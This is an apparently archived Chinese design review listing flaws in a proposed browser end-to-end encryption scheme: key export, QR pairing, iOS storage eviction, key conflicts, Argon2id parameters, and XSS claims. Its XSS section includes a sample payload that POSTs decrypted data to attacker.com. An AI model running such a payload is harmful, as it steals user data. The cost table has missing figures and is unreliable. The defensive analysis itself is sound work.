# E2E 加密实现 - 关键问题总结

> **状态：已归档 — 仅作参考**
>
> 记录了已拒绝的设备密钥方案中的阻塞问题。保留以提供历史上下文。

## ⚠️ 未解决这些问题前请勿实施

本文档总结了 **5 次独立代理审查**设备生成密钥加密方案时发现的**关键阻塞问题**。

---

## 🔴 阻塞问题 #1：不可导出密钥的矛盾

**位置：** e2e-encryption-device-keys-DRAFT.md 第 194-218 行

**问题：**

`	ypescript
// 方案将密钥创建为不可导出
const key = await crypto.subtle.generateKey(
  { name: 'AES-GCM', length: 256 },
  false, // ⚠️ 不可导出
  ['encrypt', 'decrypt']
);

// 但随后尝试导出用于云备份
async exportKeyForBackup(): Promise<ArrayBuffer> {
  return crypto.subtle.exportKey('raw', key); // ⚠️ 将失败！
}
`

**为何会出问题：**

- WebCrypto 规范：不可导出的密钥**无法**被导出
- exportKey() 将抛出 InvalidAccessError
- 云备份功能将完全无法使用

**修复：**

`	ypescript
// 启用云备份时密钥必须可导出
const extractable = userWantsCloudBackup ? true : false;
const key = await crypto.subtle.generateKey(
  { name: 'AES-GCM', length: 256 },
  extractable, // ✅ 根据用户选择决定
  ['encrypt', 'decrypt'],
);
`

**影响：** **严重 - 整个云备份功能无法使用**

**预计修复时间：** 2 天（设计 + 实现 + 测试）

---

## 🔴 阻塞问题 #2：QR 码安全性完全未指定

**位置：** e2e-encryption-device-keys-DRAFT.md 第 104-116 行

**问题：**
方案提到"包含加密主密钥的 QR 码"，但：

- ⚠️ 未指定如何加密
- ⚠️ 未定义密钥交换协议
- ⚠️ 无中间人攻击防护
- ⚠️ 无视觉验证

**可能的问题：**

`
场景：中间人攻击
1. 用户尝试配对新设备
2. 攻击者拦截 QR 码显示（屏幕共享恶意软件）
3. 攻击者显示自己的 QR 码
4. 用户扫描攻击者的 QR → 主密钥泄露
5. 攻击者解密所有数据
`

**行业标准：WhatsApp 的 ECDH 配对**

`	ypescript
// 1. 主设备生成临时 ECDH 密钥对
const primaryKeypair = await crypto.subtle.generateKey(
  { name: 'ECDH', namedCurve: 'P-256' },
  true,
  ['deriveKey']
);

// 2. QR 码仅包含公钥（安全）
const qrPayload = {
  publicKey: await crypto.subtle.exportKey('spki', primaryKeypair.publicKey),
  sessionId: generateSessionId(),
};

// 3. 新设备生成自己的 ECDH 密钥对
const newDeviceKeypair = await crypto.subtle.generateKey(...);

// 4. 两个设备推导共享会话密钥（ECDH 魔法）
const sessionKey = await crypto.subtle.deriveKey(
  { name: 'ECDH', public: otherDevicePublicKey },
  ownPrivateKey,
  { name: 'AES-GCM', length: 256 },
  false,
  ['encrypt', 'decrypt']
);

// 5. 主设备用会话密钥加密主密钥
const encryptedMasterKey = await crypto.subtle.encrypt(
  { name: 'AES-GCM', iv: randomIV },
  sessionKey,
  masterKey
);

// 6. 视觉验证（两台设备上的 6 位验证码）
const verificationCode = await calculateFingerprint(
  primaryPublicKey,
  newDevicePublicKey
);
// 用户确认验证码匹配 → 防止中间人攻击
`

**影响：** **严重 - QR 配对完全不安全**

**预计修复时间：** 5 天（协议设计 + 服务器协调 + UI + 测试）

---

## 🔴 阻塞问题 #3：iOS Safari 7 天数据丢失

**位置：** 方案中未提及

**问题：**
iOS Safari **在 7 天不活动后自动删除**所有 IndexedDB 数据。

**证据：**

- Apple 开发者文档："iOS 上的 Safari 在 7 天后删除非持久化的 IndexedDB"
- 影响 **30% 的移动用户**（Safari 移动端市场份额）
- JavaScript API 无法阻止

**实际影响：**

`
第 1 天：用户在 iPhone 上设置加密
第 8 天：用户打开应用（已 7 天未使用）
结果：IndexedDB 被删除 → 加密密钥丢失 → 所有数据丢失
`

**当前方案：** 可选的恢复密码（用户可以跳过）
**问题：** 跳过的用户在 7 天后丢失所有数据

**修复：平台特定的恢复要求**

`	ypescript
// 检测 iOS Safari
const isIOSSafari = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;

if (isIOSSafari) {
  // 在 iOS 上要求恢复密码（不可选）
  const password = await showRecoveryPasswordDialog({
    canSkip: false, // ⚠️ iOS 上没有跳过按钮
    message: 'iOS Safari 可能删除本地数据。需要恢复密码。',
  });
} else {
  // 桌面端：可选的恢复密码
  const password = await showRecoveryPasswordDialog({
    canSkip: true, // ✅ 桌面端可以跳过
  });
}
`

**替代方案：** 在移动端使用 Capacitor 原生存储

`	ypescript
if (IS_CAPACITOR) {
  // 使用 Capacitor 的原生存储（不会在 7 天后被清除）
  await CapacitorStorage.set({ key: 'masterKey', value: keyData });
}
`

**影响：** **严重 - iOS Safari 用户潜在的数据完全丢失**

**预计修复时间：** 3 天（平台检测 + 恢复流程 + Capacitor 存储集成）

---

## 🔴 阻塞问题 #4：静默密钥冲突（多设备）

**位置：** 方案中未提及

**问题：**
多设备用户以不同的密钥结束，但没有冲突检测。

**场景：**

`
设备 A：生成密钥 KA，启用云备份，上传加密的 KA
设备 B：生成密钥 KB，也启用云备份
       → 服务器愉快地接受 KB 的备份
       → 覆盖了 KA！
设备 A：下次同步 → 尝试从云备份获取密钥
       → 下载 KB，解密成功（使用同一恢复密码）
       → 现在用 KB 解密 KA 加密的数据 → 数据损坏！
`

**最小修复：服务器端冲突检测**

`	ypescript
async function uploadKeyBackup(
  userId: string,
  encryptedKey: EncryptedKeyBlob,
): Promise<UploadResult> {
  const existing = await db.keyBackup.findUnique({ where: { userId } });

  if (existing) {
    // 比较指纹（恢复密码 + 密钥材料的哈希）
    const fingerprint = await sha256(encryptedKey.ciphertext + encryptedKey.salt);

    if (fingerprint !== existing.fingerprint) {
      return {
        status: 'CONFLICT',
        message:
          'Different key already backed up for this account. ' +
          'Did you set up encryption on another device?',
      };
    }
  }

  // 存储新备份
  await db.keyBackup.upsert({
    where: { userId },
    create: { userId, ...encryptedKey, fingerprint },
    update: { ...encryptedKey, fingerprint },
  });

  return { status: 'OK' };
}
`

**更好的修复：交互式冲突解决**

`	ypescript
// 当检测到密钥冲突时：
async function handleKeyConflict() {
  const choice = await showDialog({
    title: 'Encryption Key Conflict',
    message:
      'Multiple encryption keys found for this account. ' +
      'Which one should we use?',
    buttons: [
      'Use this device\'s key (upload)',
      'Use other device\'s key (download)',
      'Cancel Setup',
    ],
  });

  if (choice === 0) {
    await uploadKeyBackup({ force: true }); // 覆盖
  } else if (choice === 1) {
    await downloadKeyBackup(); // 导入其他密钥
  }
}
`

**影响：** **严重 - 多设备设置中静默数据丢失**

**预计修复时间：** 3 天（服务器冲突检测 + 客户端解决 UI + 测试）

---

## 🟡 高优先级：Argon2id 参数过弱

**位置：** e2e-encryption-device-keys-DRAFT.md 第 285-290 行

**问题：**

`	ypescript
const kek = await Argon2id.hash(recoveryPassword, {
  salt,
  iterations: 3, // ⚠️ 最低标准（2019）
  memory: 64 * 1024, // ⚠️ 64 MB（最低标准）
  hashLength: 32,
});
`

**OWASP 2024 建议：**

- 最低：64 MB，3 次迭代（2019）
- **建议：256 MB，4 次迭代**（2025）
- 高安全性：512 MB，4 次迭代

**攻击成本分析：**

| 密码            | 当前（64MB，3 次迭代） | 建议（256MB，4 次迭代） |
| -------------- | ---------------------- | ----------------------- |
| 8 位简单密码    | 1 天 = .40           | 5 天 =               |
| 10 位混合密码   | 2 年 = ,750          | 10 年 = ,750          |

**修复：**

`	ypescript
const kek = await Argon2id.hash(recoveryPassword, {
  salt,
  iterations: 4, // ✅ +1 次迭代
  memory: 256 * 1024, // ✅ 增强 4 倍
  parallelism: 2, // 移动端友好
  hashLength: 32,
});
`

**移动端考虑：**

`	ypescript
// 低端设备的自适应参数
const memory = IS_LOW_END_MOBILE ? 128 * 1024 : 256 * 1024;
const iterations = IS_LOW_END_MOBILE ? 3 : 4;
`

**影响：** **高 - 弱密码易受暴力破解攻击**

**预计修复时间：** 1 天（参数更新 + 移动端检测 + 测试）

---

## 🟡 高优先级：虚假的 XSS 防护声明

**位置：** e2e-encryption-device-keys-DRAFT.md 第 43、196、662 行

**问题：**
方案声称"不可导出的密钥可以防御 XSS"

**这是错误的：**

`javascript
// XSS 载荷仍然可以这样做：
const key = await indexedDB.getKey('master');
const plaintext = await crypto.subtle.decrypt(
  { name: 'AES-GCM', iv },
  key,
  encryptedData,
);
fetch('https://attacker.com', { method: 'POST', body: plaintext }); // ⚠️ 数据被窃取
`

**不可导出实际防止的是：**

- ✅ 防止：crypto.subtle.exportKey('raw', key)（导出原始字节）
- ⚠️ 不防止：使用密钥进行加密/解密操作
- ⚠️ 不防止：XSS 攻击

**真正的 XSS 防护：**

`html
<!-- 内容安全策略 -->
<meta
  http-equiv="Content-Security-Policy"
  content="script-src 'self' 'sha256-...'; object-src 'none';"
/>

<!-- 子资源完整性 -->
<script
  src="app.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>
`

**修复：**

1. 删除关于 XSS 防护的误导性注释
2. 添加诚实的威胁模型说明："XSS 可以通过加密/解密 API 访问明文"
3. 实施真正的 CSP + SRI 防护

**影响：** **高 - 用户误解安全保证**

**预计修复时间：** 1 天（文档 + CSP/SRI 设置）

---

## 总结：阶段 0 需要的关键修复

**在任何实施之前：**

| 问题                | 严重程度 | 修复时间 | 阻塞实施？ |
| ------------------ | -------- | -------- | --------- |
| 不可导出密钥        | 阻塞     | 2 天     | ✅ 是      |
| QR 码安全漏洞       | 阻塞     | 5 天     | ✅ 是      |
| iOS 7 天数据丢失    | 阻塞     | 3 天     | ✅ 是      |
| 密钥冲突            | 阻塞     | 3 天     | ✅ 是      |
| Argon2id 参数过弱   | 高       | 1 天     | ⚠️ 建议    |
| XSS 误解            | 高       | 1 天     | ⚠️ 建议    |

**阶段 0 总时间：** 15 天（3 周）

**修订后的实施时间线：**

- 阶段 0：关键修复（3 周）
- 阶段 1-6：原计划（12 周）
- **总计：15 周**（原为 12 周）

---

## 信心评估

**代理审查之前：** 85%
**代理审查之后：** 50%
**阶段 0 修复后：** 预计 85%

**建议：** **不要继续**进行阶段 0 修复。所有 4 个阻塞问题将导致：

- 功能完全失效（不可导出）
- 安全漏洞（QR 中间人攻击）
- 数据丢失（iOS 数据清除，密钥冲突）

---

## 相关文档

- 完整修订方案：docs/long-term-plans/e2e-encryption-device-keys-DRAFT.md
- 代理审查报告：/home/johannes/.claude/plans/dapper-riding-seahorse-agent-*.md
- 安全审查：代理 a5dd02f（全面威胁分析）
- 性能审查：代理 a526436（WebCrypto 基准测试）

---

**文档状态：** 草案 - 关键问题总结
**最后更新：** 2026-01-23
**下次审查：** 阶段 0 修复实施后

